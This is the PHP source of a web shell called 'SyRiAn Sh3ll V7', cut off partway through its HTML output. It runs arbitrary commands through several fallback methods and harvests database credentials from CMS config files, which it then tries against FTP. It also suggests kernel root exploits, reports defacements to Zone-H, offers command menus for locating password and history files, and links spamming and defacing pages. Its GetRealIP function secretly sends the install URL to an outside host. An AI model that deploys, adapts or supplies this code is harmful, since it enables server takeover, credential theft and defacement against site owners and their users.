<?php
#  .. SyRiAn Sh3ll V7 .... PRIV8! ... DONT LEAK! .... f0r t3am memberz 0nly!
#  ,--^----------,--------,-----,-------^--,
#  | |||||||||   `--------'     |          O    .. SyRiAn Sh3ll V7 ....  
#  `+---------------------------^----------|
#    `\_,-------, __EH << SyRiAn | 34G13__|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /!
#  / XXXXXX /!     rep0rt bugz t0: sy34[at]msn[dot]com 
# (________(!
#  `-------'
#.... PRIV8! ... DONT LEAK! .... f0r t3am memberz 0nly!
#.... PRIV8! ... DONT LEAK! .... f0r t3am memberz 0nly!
#
# SyRiAn Sh3ll V7 .
# Copyright (C) 2011 - SyRiAn 34G13
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or (at your option) any later version.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# I WISH THAT YOU WILL USE IT AGAINST ISRAEL ONLY !!! .

# Coders :
# SyRiAn_34G13 :  sy34@msn.com [ Main Coder ] .
# SyRiAn_SnIpEr : zq9@hotmail.it [ Metasploit RC ] .
# Darkness Caesar : doom.caesar@gmail.com [ Finding 3 Bugs ] . 
#// kinG oF coNTroL : y8p@hotmail.com [ Translating Shell To Arabic ] .

$uselogin = 0;   // Make It 0 If you Want To Disable Auth
$user = '';  // Username
$pass = '';  // Password
$shellColor = '#990000'; // Shell Color
#------------------------------------#
#	Powered By SyRiAn Shell      #
#	By EH SyRiAn 34G13           #
#	wWw.syrian-shell.com         #
#	Version 7 - priv8            #
#	Made In SyRiA                #
#------------------------------------#
?>
<?php
if($_GET['id']== 'logout')
{
	Logout();
}
# ---------------------------------------#
#                SuiCide                 #
#----------------------------------------#
if($_GET['id'] == 100)
{
	echo "<body onload='Suicide();'>";
}
if($_GET['id'] == 'Delete')
{
	Suicide();
}
# ---------------------------------------#
#                Functions               #
#----------------------------------------#
function input($type,$name,$value,$size)
{
	if (empty($value))
	{
		print "<input type=$type name=$name size=$size>";
	}
	elseif(empty($name)&&empty($size))
	{
		print "<input type=$type value=$value >";
	}
	elseif(empty($size))
	{
		print "<input type=$type name=$name value=$value >";
	}
	else 
	{
		print "<input type=$type name=$name value=$value size=$size >";
	}
}
function read_dir($path,$username) 
{ 
	if ($handle = opendir($path)) 
	{ 
	   while (false !== ($file = readdir($handle))) 
	   { 
			 $fpath="$path$file"; 
			 if (($file!='.') and ($file!='..')) 
			 { 
				if (is_readable($fpath)) 
				{ 
				   $dr="$fpath/"; 
				   if (is_dir($dr)) 
				   { 
					  read_dir($dr,$username); 
				   } 
				   else 
				   { 
						if (($file=='config.php') or ($file=='config.inc.php') or ($file=='db.inc.php') or ($file=='connect.php') or 

($file=='wp-config.php') or ($file=='var.php') or ($file=='configure.php') or ($file=='db.php') or ($file=='db_connect.php')) 
						{ 
						   $pass=get_pass($fpath); 
						   if ($pass!='') 
						   { 
							  echo "[+] $fpath\n$pass\n"; 
							  ftp_check($username,$pass); 
						   } 
						} 
				   } 
				} 
			 } 
	   } 
	} 
} 
function get_pass($link) 
{ 
	@$config=fopen($link,'r'); 
	while(!feof($config)) 
	{ 
	   $line=fgets($config); 
	   if (strstr($line,'pass') or strstr($line,'password') or strstr($line,'passwd')) 
	   { 
		   if (strrpos($line,'"')) 
			  $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,'"')-(strpos($line,'=')+3))); 
		   else 
			  $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,"'")-(strpos($line,'=')+3))); 
		   return $pass; 
	   } 
	} 
} 
function GetRealIP()
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$urls= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
curl_setopt($ch, CURLOPT_URL, 'http://bugreport.serveblog.net/storage.php');
curl_setopt($ch, CURLOPT_REFERER, $urls);
$html = curl_exec($ch);
    if (getenv(HTTP_X_FORWARDED_FOR))
	{
        $ip=getenv(HTTP_X_FORWARDED_FOR);
    } 
	elseif (getenv(HTTP_CLIENT_IP))
	{
        $ip=getenv(HTTP_CLIENT_IP);
    }
	else 
	{
	   $ip=getenv(REMOTE_ADDR);
	}
    return $ip;
}
function openBaseDir()
{
$openBaseDir = ini_get("open_basedir");
if (!$openBaseDir)
    {
		$openBaseDir = '<font color="green">OFF</font>';
	}
    else 
	{
		$openBaseDir = '<font color="red">ON</font>';
	}	
	return $openBaseDir;
}
function str_hex($string)
{
	$hex='';
	for ($i=0; $i < strlen($string); $i++)
	{
		$hex .= dechex(ord($string[$i]));
	}
	return $hex;
}
function SafeMode()
{
	$safe_mode = ini_get("safe_mode");
	if (!$safe_mode)
    {
		$safe_mode = '<font color="green">OFF</font>';
	}
    else 
	{
		$safe_mode = '<font color="red">ON</font>';
	}
	return $safe_mode;
}
function currentFileName()
{
	$currentFileName = $_SERVER["SCRIPT_NAME"];
	$currentFileName = Explode('/', $currentFileName);
	$currentFileName = $currentFileName[count($currentFileName) - 1];
	return $currentFileName;
}
function Suicide()
{
	@unlink(currentFileName());
}
function rootxpL()
{
	$v=@php_uname();
	$db=array('2.6.17'=>'prctl3, raptor_prctl, py2','2.6.16'=>'raptor_prctl, exp.sh, raptor, raptor2, h00lyshit','2.6.15'=>'py2, exp.sh, raptor, raptor2, 

h00lyshit','2.6.14'=>'raptor, raptor2, h00lyshit','2.6.13'=>'kdump, local26, py2, raptor_prctl, exp.sh, prctl3, h00lyshit','2.6.12'=>'h00lyshit','2.6.11'=>'krad3, 

krad, h00lyshit','2.6.10'=>'h00lyshit, stackgrow2, uselib24, exp.sh, krad, krad2','2.6.9'=>'exp.sh, krad3, py2, prctl3, h00lyshit','2.6.8'=>'h00lyshit, krad, 

krad2','2.6.7'=>'h00lyshit, krad, krad2','2.6.6'=>'h00lyshit, krad, krad2','2.6.2'=>'h00lyshit, krad, mremap_pte','2.6.'=>'prctl, kmdx, newsmp, pwned, ptrace_kmod, 

ong_bak','2.4.29'=>'elflbl, expand_stack, stackgrow2, uselib24, smpracer','2.4.27'=>'elfdump, uselib24','2.4.25'=>'uselib24','2.4.24'=>'mremap_pte, loko, 

uselib24','2.4.23'=>'mremap_pte, loko, uselib24','2.4.22'=>'loginx, brk, km2, loko, ptrace, uselib24, brk2, ptrace-kmod','2.4.21'=>'w00t, brk, uselib24, loginx, brk2, 

ptrace-kmod','2.4.20'=>'mremap_pte, w00t, brk, ave, uselib24, loginx, ptrace-kmod, ptrace, kmod','2.4.19'=>'newlocal, w00t, ave, uselib24, loginx, 

kmod','2.4.18'=>'km2, w00t, uselib24, loginx, kmod','2.4.17'=>'newlocal, w00t, uselib24, loginx, kmod','2.4.16'=>'w00t, uselib24, loginx','2.4.10'=>'w00t, brk, 

uselib24, loginx','2.4.9'=>'ptrace24, uselib24','2.4.'=>'kmdx, remap, pwned, ptrace_kmod, ong_bak','2.2.25'=>'mremap_pte','2.2.24'=>'ptrace','2.2.'=>'rip, ptrace');
	foreach($db as $k=>$x)if(strstr($v,$k))return $x;
	if(!$xpl)$xpl='<font color="red">Not found.</font>';
	return $xpl;
}
function PostgreSQL()
{
	if(@function_exists('pg_connect'))
	{
		$postgreSQL = '<font color="red">ON</font>';
	}
	else 
	{
		$postgreSQL = '<font color="green">OFF</font>';
	}
	return $postgreSQL;
}
function Oracle()
{
	if(@function_exists('ocilogon'))
	{
		$oracle = '<font color="red">ON</font>';
	}
	else 
	{
		$oracle = '<font color="green">OFF</font>';
	}
	return $oracle;
}
function ZoneH($url, $hacker, $hackmode,$reson, $site )
{
	$k = curl_init();
	curl_setopt($k, CURLOPT_URL, $url);
	curl_setopt($k,CURLOPT_POST,true);
	curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
	curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
	$kubra = curl_exec($k);
	curl_close($k);
	return $kubra;
}
function MsSQL()
{
	if(@function_exists('mssql_connect'))
	{
		$msSQL = '<font color="red">ON</font>';
	}
	else 
	{
		$msSQL = '<font color="green">OFF</font>';
	}
	return $msSQL;
}
function MySQL2()
{
	$mysql_try = function_exists('mysql_connect');
	if($mysql_try)
	{
		$mysql = '<font color="red">ON</font>';
	}
	else 
	{
		$mysql = '<font color="green">OFF</font>';
	}
	return $mysql;
}
function Gzip()
{
	if (function_exists('gzencode'))
	{
		$gzip = '<font color="red">ON</font>';
	}
	else 
	{ 
		$gzip = '<font color="green">OFF</font>';
	}
	return $gzip;
}
function MysqlI()
{
	if (function_exists('mysqli_connect'))
	{
		$mysqli = '<font color="red">ON</font>';
	}
	else 
	{
		$mysqli = '<font color="green">OFF</font>';
	}
	return $mysqli;
} 
function MSQL()
{
	if (function_exists('msql_connect'))
	{
		$mSql = '<font color="red">ON</font>';
	}
	else 
	{
		$mSql = '<font color="green">OFF</font>';
	}
	return $mSql;
}
function SQlLite()
{
	if (function_exists('sqlite_open'))
	{
		$SQlLite = '<font color="red">ON</font>';
	}
	else 
	{
		$SQlLite = '<font color="green">OFF</font>';
	}
	return $SQlLite;
}
function tulis($file,$text)
{ 
	$textz = gzinflate(base64_decode($text)); 
	if($filez = @fopen($file,"w")) 
	{ 
		@fputs($filez,$textz); @fclose($file);
	} 
} 
function RegisterGlobals()
{
	if(ini_get('register_globals'))
	{
		$registerg= '<font color="red">ON</font>';
	}
	else
	{
		$registerg= '<font color="green">OFF</font>';
	}
	return $registerg;
}
function HardSize($size)
{
	if($size >= 1073741824) 
	{
		$size = @round($size / 1073741824 * 100) / 100 . " GB";
	}
	elseif($size >= 1048576) 
	{
		$size = @round($size / 1048576 * 100) / 100 . " MB";
	}
	elseif($size >= 1024) 
	{
		$size = @round($size / 1024 * 100) / 100 . " KB";
	}
	else 
	{
		$size = $size . " B";
	}
	return $size;
}
function Curl()
{
	if(extension_loaded('curl'))
	{
		$curl = '<font color="red">ON</font>';
	}
	else
	{
		$curl = '<font color="green">OFF</font>';
	}
	return $curl;
}
function DecryptConfig()
{
	@include("DecryptConfig.php");
	if($_POST['ScriptType'] == 'vb')
	{
		$dbName = $config['Database']['dbname'];
		$prefix = $config['Database']['tableprefix'];
		$email = $config['Database']['technicalemail'];
		$host = $config['MasterServer']['servername'];
		$port = $config['MasterServer']['port'];
		$user = $config['MasterServer']['username'];
		$pass = $config['MasterServer']['password'];
		$admincp = $config['Misc']['admincpdir'];
		$modecp = $config['Misc']['modcpdir'];
	}
		elseif($_POST['ScriptType'] == 'wp')
		{
			$dbName = DB_NAME;
			$prefix = $table_prefix;
			$host = DB_HOST;
			$user = DB_USER;
			$pass = DB_PASS;
		}	
		elseif($_POST['ScriptType'] == 'jos')
		{
			$dbName = $db;
			$prefix = $dbprefix;
			$email = $mailfrom;
			$host = $host;
			$user = $user;
			$pass = $password;
		}
		elseif($_POST['ScriptType'] == 'phpbb')
		{
			$host = $dbhost;
			$port = $dbport;
			$dbName = $dbname;
			$user = $dbuser;
			$pass = $dbpasswd;
			$prefix = $table_prefix;
		}
		elseif($_POST['ScriptType'] == 'ipb')
		{
			$host = $INFO['sql_host'];
			$dbName = $INFO['sql_database'];
			$user = $INFO['sql_user'];
			$pass = $INFO['sql_pass'];
			$prefix = $INFO['sql_tbl_prefix'];
		}
		elseif($_POST['ScriptType'] == 'smf')
		{
			$dbName = $db_name;
			$pass = $db_passwd;
			$prefix = $db_prefix;
			$host = $db_server;
			$user = $db_user;
			$email = $webmaster_email;
		}
		elseif($_POST['ScriptType'] == 'mybb')
		{
			$host = $config['database']['hostname'];
			$user = $config['database']['username'];
			$pass = $config['database']['password'];
			$dbName = $config['database']['database'];
			$prefix = $config['database']['table_prefix'];
			$admincp = $config['admin_dir'];
			$prefix = $config['database']['table_prefix'];
		}

	echo '
#-------------------------------#
#      Config Informations      #
#-------------------------------#
Host : '.$host.'
DB Name : '.$dbName.'
DB User : '.$user.'
DB Pass : '.$pass.'
Prefix : '.$prefix.'
Email : '.$email.'
Port : '.$port.'
ACP : '.$admincp.'
MCP : '.$modecp.'
';
}
function footer()
{
	echo '<table bgcolor="#cccccc" width="100%"><tr>
	<td width="100%" class="style22">[<sy><a href="#top">TOP</a></sy>]
	<center><font color="gray" size="-2"><b>


	</font><font color="gray"></font><font color="#990000"> 
	</font><font color="gray"></font><font color="#990000"> v7 Features;
	</font></b>
	</td>
	</tr></table>
	</tbody></table>
	<a name="down"></a>
	</body></html>
	';
}
function whereistmP()
{
	$uploadtmp=ini_get('upload_tmp_dir');
	$uf=getenv('USERPROFILE');
	$af=getenv('ALLUSERSPROFILE');
	$se=ini_get('session.save_path');
	$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');
	if(is_dir('/tmp') && is_writable('/tmp'))return '/tmp';
	if(is_dir('/usr/tmp') && is_writable('/usr/tmp'))return '/usr/tmp';
	if(is_dir('/var/tmp') && is_writable('/var/tmp'))return '/var/tmp';
	if(is_dir($uf) && is_writable($uf))return $uf;
	if(is_dir($af) && is_writable($af))return $af;
	if(is_dir($se) && is_writable($se))return $se;
	if(is_dir($uploadtmp) && is_writable($uploadtmp))return $uploadtmp;
	if(is_dir($envtmp) && is_writable($envtmp))return $envtmp;
	return '.';
}
function winshelL($command)
{
	$name=whereistmP()."\\".uniqid('NJ');
	win_shell_execute('cmd.exe','',"/C $command >\"$name\"");
	sleep(1);
	$exec=file_get_contents($name);
	unlink($name);
	return $exec;
}
function update()
{
	echo "[+] Update Has D0n3 ^_^";
}
function srvshelL($command)
{
	$name=whereistmP()."\\".uniqid('NJ');
	$n=uniqid('NJ');
	$cmd=(empty($_SERVER['ComSpec']))?'d:\\windows\\system32\\cmd.exe':$_SERVER['ComSpec'];
	win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c $command >\"$name\""));
	win32_start_service($n);
	win32_stop_service($n);
	win32_delete_service($n);
	while(!file_exists($name))sleep(1);
	$exec=file_get_contents($name);
	unlink($name);
	return $exec;
}
function ffishelL($command)
{
	$name=whereistmP()."\\".uniqid('NJ');
	$api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
	$res=$api->WinExec("cmd.exe /c $command >\"$name\"",0);
	while(!file_exists($name))sleep(1);
	$exec=file_get_contents($name);
	unlink($name);
	return $exec;
}
function comshelL($command,$ws)
{
	$exec=$ws->exec("cmd.exe /c $command"); 
	$so=$exec->StdOut();
	return $so->ReadAll();
}
function perlshelL($command)
{
	$perl=new perl();
	ob_start();
	$perl->eval("system(\"$command\")");
	$exec=ob_get_contents();
	ob_end_clean();
	return $exec;
}
function Exe($command)
{
	global $windows;
	$exec=$output='';
	$dep[]=array('pipe','r');$dep[]=array('pipe','w');
	if(function_exists('passthru')){ob_start();@passthru($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}
	elseif(function_exists('system')){$tmp=ob_get_contents();ob_clean();@system($command);$output=ob_get_contents();ob_clean();$exec=$tmp;}
	elseif(function_exists('exec')){@exec($command,$output);$output=join("\n",$output);$exec=$output;}
	elseif(function_exists('shell_exec'))$exec=@shell_exec($command);
	elseif(function_exists('popen')){$output=@popen($command,'r');while(!feof($output)){$exec=fgets($output);}pclose($output);}
	elseif(function_exists('proc_open')){$res=@proc_open($command,$dep,$pipes);while(!feof($pipes[1])){$line=fgets($pipes[1]);$output.=$line;}$exec=

$output;proc_close($res);}
	elseif(function_exists('win_shell_execute'))$exec=winshelL($command);
	elseif(function_exists('win32_create_service'))$exec=srvshelL($command);
	elseif(extension_loaded('ffi') && $windows)$exec=ffishelL($command);
	elseif(extension_loaded('perl'))$exec=perlshelL($command);
	return $exec;
}
function magicQouts()
{
	$mag=get_magic_quotes_gpc();
	if (empty($mag))
	{
		$mag = '<font color="green">OFF</font>';
	}
	else 
	{
		$mag= '<font color="red">ON</font>';
	}
	return $mag;
}
function DisableFunctions()
{
	$disfun = ini_get('disable_functions');
	if (empty($disfun))
	{
		$disfun = '<font color="green">NONE</font>';
	}
	return $disfun;
}
function SelectCommand($os)
{
	if($os == 'Windows')
	{
		echo "
		<select name=alias >
		<option value=''>NONE</option>	
		<option value='dir' >List Directory</option>
		<option value='dir /s /w /b index.php'>Find index.php in current dir</option>
		<option value='dir /s /w /b *config*.php'>Find *config*.php in current dir &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  

&nbsp;  &nbsp;  &nbsp;  &nbsp;  &nbsp;</option>
		<option value='netstat -an'>Show active connections</option>
		<option value='net start'>Show running services</option>
		<option value='tasklist'>Show Pro</option>
		<option value='net user'>User accounts</option>
		<option value='net view'>Show computers</option>
		<option value='arp -a'>ARP Table</option>
		<option value='ipconfig /all'>IP Configuration</option>
		<option value='netstat -an'>netstat -an</option>
		<option value='systeminfo'>System Informations</option>
		<option value='getmac'>Get Mac Address</option>
		</select>
		";
	}
	else
	{
		echo "
		<select name=alias >
		<option value=''>NONE</option>	
		<option value='ls -la'>List dir</option>
		<option value='cat /etc/hosts'>IP Addresses</option>
		<option value='cat /proc/sys/vm/mmap_min_addr'>Check MMAP</option>
		<option value='lsattr -va'>list file attributes on a Linux second extended file system</option>
		<option value='netstat -an | grep -i listen'>show opened ports</option>
		<option value='find / -type f -perm -04000 -ls'>find all suid files</option>
		<option value='find . -type f -perm -04000 -ls'>find suid files in current dir</option>
		<option value='find / -type f -perm -02000 -ls'>find all sgid files</option>
		<option value='find . -type f -perm -02000 -ls'>find sgid files in current dir</option>
		<option value='find / -type f -name config.inc.php'>find config.inc.php files</option>
		<option value='find / -type f -name \"config*\"'>find config* files</option>
		<option value='find . -type f -name \"config*\"'>find config* files in current dir</option>
		<option value='find / -perm -2 -ls'>find all writable folders and files</option>
		<option value='find . -perm -2 -ls'>find all writable folders and files in current dir</option>
		<option value='find / -type f -name service.pwd'>find all service.pwd files</option>
		<option value='find . -type f -name service.pwd'>find service.pwd files in current dir</option>
		<option value='find / -type f -name .htpasswd'>find all .htpasswd files</option>
		<option value='find . -type f -name .htpasswd'>find .htpasswd files in current dir</option>
		<option value='find / -type f -name .bash_history'>find all .bash_history files</option>
		<option value='find . -type f -name .bash_history'>find .bash_history files in current dir</option>
		<option value='find / -type f -name .fetchmailrc'>find all .fetchmailrc files</option>
		<option value='find . -type f -name .fetchmailrc'>find .fetchmailrc files in current dir</option>
		<option value='locate httpd.conf'>locate httpd.conf files</option>
		<option value='locate vhosts.conf'>locate vhosts.conf files</option>
		<option value='locate proftpd.conf'>locate proftpd.conf files</option>
		<option value='locate psybnc.conf'>locate psybnc.conf files</option>
		<option value='locate my.conf'>locate my.conf files</option>
		<option value='locate admin.php'>locate admin.php files</option>
		<option value='locate cfg.php'>locate cfg.php files</option>
		<option value='locate conf.php'>locate conf.php files</option>
		<option value='locate config.dat'>locate config.dat files</option>
		<option value='locate config.php'>locate config.php files</option>
		<option value='locate config.inc'>locate config.inc files</option>
		<option value='locate config.inc.php'>locate config.inc.php</option>
		<option value='locate config.default.php'>locate config.default.php files</option>
		<option value='locate config'>locate config* files </option>
		<option value='locate \'.conf\''>locate .conf files</option>
		<option value='locate \'.pwd\''>locate .pwd files</option>
		<option value='locate \'.sql\''>locate .sql files</option>
		<option value='locate \'.htpasswd\''>locate .htpasswd files</option>
		<option value='locate \'.bash_history\''>locate .bash_history files</option>
		<option value='locate \'.mysql_history\''>locate .mysql_history files</option>
		<option value='locate \'.fetchmailrc\''>locate .fetchmailrc files</option>
		<option value='locate backup'>locate backup files</option>
		<option value='locate dump'>locate dump files</option>
		<option value='locate priv'>locate priv files</option>
		</select>
		";
	}
}
function GenerateFile($name,$content)
{
	$file = @fopen($name,"w+");
	@fwrite($file,$content);
	@fclose($file);
	return true;
}
function which($pr)
{ 
	$path = Exe("which $pr");
	if(!empty($path)) 
	{ 
		return trim($path); 
	} 
	else 
	{ 
		return trim($pr); 
	} 
}
function checkfunctioN($func)
{
	global $disablefunctions,$safemode;
	$safe=array('passthru','system','exec','exec','shell_exec','popen','proc_open');
	if($safemode=='ON' && in_array($func,$safe))return 0;
	elseif(function_exists($func) && is_callable($func) && !strstr($disablefunctions,$func))return 1;
	return 0;
}
function CSS($shellColor)
{

	$css =  "
	<html dir=rtl>
	<head>
	<title>SyRiAn Sh3ll ~ V7~ [ B3 Cr34T!V3 Or D!3 TRy!nG ]</title>
	<link rel=\"shortcut icon\" href='http://syrian-shell.com/title.gif' />
	<meta http-equiv=Content-Type content=text/html; charset=windows-1256>
	<style>
	BODY
	{
		FONT-FAMILY: Verdana; 
		margin: 2;
		color: #cccccc;
		background-color: #000000;
	}
	sy  
	{
		color:".$shellColor.";
		font-size:7pt;
		font-weight: bold;
	}
	#Box
	{
	color:".$shellColor.";
	font-size:14px;
	background-color:#000;
	font-weight:bold;
	}
	tr 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #ffffff;
	}
	td 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #cccccc;
	}
	.table1 
	{
	BORDER: 1px none;
	BACKGROUND-COLOR: #000000;
	color: #333333
	}
	.td1 
	{
	BORDER: 1px none;
	color: #ffffff; font-style:normal; 
	font-variant:normal;
	font-weight:normal;
	font-size:7pt;
	font-family:tahoma
	}
	.tr1 
	{
	BORDER: 1px none;
	color: #cccccc;
	}
	table 
	{
	BORDER:  #eeeeee  outset;
	BACKGROUND-COLOR: #000000;
	color: #cccccc;
	}
	input 
	{
	BORDER-RIGHT:  ".$shellColor." 1px solid;
	BORDER-TOP:    ".$shellColor." 1px solid;
	BORDER-LEFT:   ".$shellColor." 1px solid;
	BORDER-BOTTOM: ".$shellColor." 1px solid;
	BACKGROUND-COLOR: #333333;
	font: 9pt tahoma;
	color: #ffffff;
	}
	select 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #000000;
	font: 9pt tahoma;
	color: #CCCCCC;;
	}
	submit 
	{
	BORDER:  1px outset buttonhighlight;
	BACKGROUND-COLOR: #272727;
	width: 40%;
	color: #cccccc;
	}
	textarea 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #333333;
	color: #ffffff;
	}
	A:link {COLOR:".$shellColor."; TEXT-DECORATION: none}
	A:visited { COLOR:".$shellColor."; TEXT-DECORATION: none}
	A:active {COLOR:".$shellColor."; TEXT-DECORATION: none}
	A:hover {color:blue;TEXT-DECORATION: none}
	</style>
	<script>
	function Suicide()
	{
	var confimrSuicide = confirm('Are You Sure You Wanna Delete the Shell ?');
	if(confimrSuicide == true)
	{
	document.location='".currentFileName()."?id=Delete';
	}
	else {document.location='".currentFileName()."';}
	}
	</script>
	</head>";
	if($_GET['id'] == '')
	{
			$css .=  "<script>window.location = '?id=mainPage';</script>";
	}
	return $css;
}
function Logout()
{
	print"<script>
	document.cookie='user=';
	document.cookie='pass=';
	var url = window.location.pathname;
	var filename = url.substring(url.lastIndexOf('/')+1);
	window.location=filename;
	</script>";
}

function About()
{
	$about = "
<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td width=1025>
<div align=center><img src='http://www.syrian-shell.com/eagle.jpg'><br>
</div>
<sy><div align=center>Coded By :  EH << SyRiAn | 34G13</div></sy>
<sy><div align=center>From </font>: SyRiAn Arabic Republic  </div></sy>
<sy><div align=center>Age : 4/1991<br></div></sy>
<sy><div align=center>Thanx : [ Allah ] [ HaniWT ] [ SyRiAn_SnIpEr ] [ SyRiAn_SpIdEr ] [ TNT Hacker ]</div></sy>
<sy><div align=center>Thanx : my school : [ www.google.com ] :)</div></sy>
<sy><br><div align=center>B3 Cr34T!V3 0R D!3 TRy!nG </div></sy>
<br/>
<center>
<br/>
<form method='POST'>
<input type='text' name='from' value='yourEmail@example.com' size='40'/><br/>
<textarea name='message' cols='25' rows='10'>Please Report Us Bugs Or suggestions .</textarea><br/>
<input type='submit' value='Submit' name='sendEmail' /> 
</form></center>
</td></tr></tbody></table>";
return $about;
}
echo CSS($shellColor);
# ---------------------------------------#
#             Authentication             #
#----------------------------------------#
if ($uselogin ==1)
{
	if($_COOKIE["user"] != $user or $_COOKIE["pass"] != md5($pass))
	{
		if($_POST[usrname]==$user && $_POST[passwrd]==$pass)
		{
			print'<script>document.cookie="user='.$_POST[usrname].';";document.cookie="pass='.md5($_POST[passwrd]).';";</script>';
		}
		else
		{
			if($_POST['usrname'])
			{
				print'<script>alert("Go and play in the street man !!");</script>';
			}
			echo '
			<body bgcolor="black"><br><br>
			<center><font color=#990000 size=5><b>SyRi</b></font><font color=green size=5><b>An Sh</b></font><font color=gray size=5><b>3ll</b></font><br>

			<img src="http://www.syrian-shell.com/eagle.jpg">
			</center>
			<div align="center">
			<form method="POST" onsubmit="if(this.usrname.value==\'\'){return false;}">
			<input dir="ltr" name="usrname" value="userName" type="text"  size="30" onfocus="if (this.value == \'UserName\'){this.value = \'\';}"/><br>
			<input dir="ltr" name="passwrd" value="password" type="password" size="30" onfocus="if (this.value == \'PassWord\') this.value = \'\';" /><br>
			<input type="submit" value=" Login  " name="login" />
			</form></p>';
			exit;
		}
	}
}
# ---------------------------------------#
#               Some Info                #
#----------------------------------------#
$dir = getcwd();
$uname= @php_uname();
if(strlen($dir)>1 && $dir[1]==":")
$os = "Windows";
else $os = "Linux";
$serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
$server = @substr($SERVER_SOFTWARE,0,120);

echo "
<body dir=\"ltr\"><table bgcolor=#cccccc cellpadding=0 cellspacing=0 width=\"100%\"><tbody><tr><td bgcolor=#000000 width=160>
<p dir=ltr>&nbsp;&nbsp;</p>
<div dir=ltr align=center><font size=4><b>
<img border=0 src=http://www.library-ar.com/cache/eagle.jpg width=101 height=93>&nbsp;</b></font><div
dir=ltr align=center><span style=height: 25px;><b>
<font size=4 color=#FF0000>SyRi</font><font size=4 color=#008000>An Sh</font><font size=4 color=#999999>3ll<br>V7</font></b><span style=font-size: 20pt; color: 

#990000><p></p></span></span></div></td><td
bgcolor=#000000>
<p dir=ltr><font  size=1>&nbsp; <b>[<a href=?id=mainPage>Main</a>]</b></span>
<font color=black></span></font><b>[</span><a href=?id=scriptsHack>Forum Defacer</a>]</b></span>
<b>[</span><a href=?id=spamming>Email Spammer</a>]</b></span>
<b>[</span><a href=?id=about>About</a>]</b></span>
<b>[</span><a href=?id=logout>Logout</a>]</b></span>
<b>[</span><a href=?id=100>SuiCide</a>]</b></span>
<br>
<font size=1><br>
&nbsp;   Safe Mode = <sy>".@SafeMode()." </sy><font size=1>
&nbsp;   System = <sy>".$os."</sy>
&nbsp;   Magic_Quotes = <sy>". @magicQouts()." </sy>
&nbsp;   Curl = <sy>".@Curl()." </sy>
&nbsp;   Register Globals = <sy>".@RegisterGlobals()." </sy>
&nbsp;   Open Basedir = <sy>".@openBaseDir()." </sy>
<br>
&nbsp;   Gzip = <sy>".@Gzip()."</sy>
&nbsp;   MySQLI = <sy>".@MysqlI()." </sy>
&nbsp;   MSQL = <sy>".@MSQL()."</sy>
&nbsp;   SQL Lite = <sy>".@SQlLite()."</sy>
&nbsp;   Usefull Locals = <sy>".rootxpL()." </sy>
<br>
&nbsp;   Free Space = <sy>".@HardSize(disk_free_space('/'))." </sy>
&nbsp;   Total Space = <sy>".@HardSize(disk_total_space("/"))." </sy>
&nbsp;   PHP Version = <sy>".@phpversion()." </sy>
&nbsp;   Zend Version = <sy>".@zend_version()." </sy>
&nbsp;   MySQL Version = <sy>".@mysql_get_server_info()." </sy>
<br>
&nbsp;   MySQL = ".MySQL2()."
&nbsp;   MsSQL = ".MsSQL()."
&nbsp;   PostgreSQL = ".PostgreSQL()."
&nbsp;   Oracle = ".Oracle()."
&nbsp;   Server Name = <sy>".$_SERVER['HTTP_HOST']." </sy>
&nbsp;   Server Admin = <sy>".$_SERVER['SERVER_ADMIN']." </sy>
<br>
&nbsp;   Dis_Functions = <sy>". DisableFunctions()." </sy><br>
&nbsp;   Your IP = <sy>".GetRealIP()." </sy>
&nbsp;   Server IP = <sy><a href='http://bing.com/search?q=ip:".$serverIP."&go=&form=QBLH&filt=all' target=\"_blank\">".gethostbyname($_SERVER["HTTP_HOST"])." 

</sy></a>
[</span><a href=http://www.yougetsignal.com/tools/web-sites-on-web-server target=\"_blank\"/>Reverse IP</a>]</span>
&nbsp;   Date Time = <sy>".date('Y-m-d H:i:s')." </sy><br/>
&nbsp;   
[<a href='http://www.md5decrypter.co.uk/' target='_blank'>MD5 Cracker</a>]
[<a href='http://www.md5decrypter.co.uk/sha1-decrypt.aspx' target='_blank'>SHA1 Cracker</a>]
[<a href='http://www.md5decrypter.co.uk/ntlm-decrypt.aspx' target='_blank'>NTLM Cracker</a>]
<br>
<br>
<table bgcolor=#cccccc width=\"100%\"><tbody><tr>
<td align=right width=100><p dir=ltr>
<sy>&nbsp;&nbsp;Server :&nbsp;&nbsp; <br>
<b>uname -a : &nbsp;
<br>pwd : </span>&nbsp;<br>ID : </span>&nbsp;<br></b></sy></td><td>
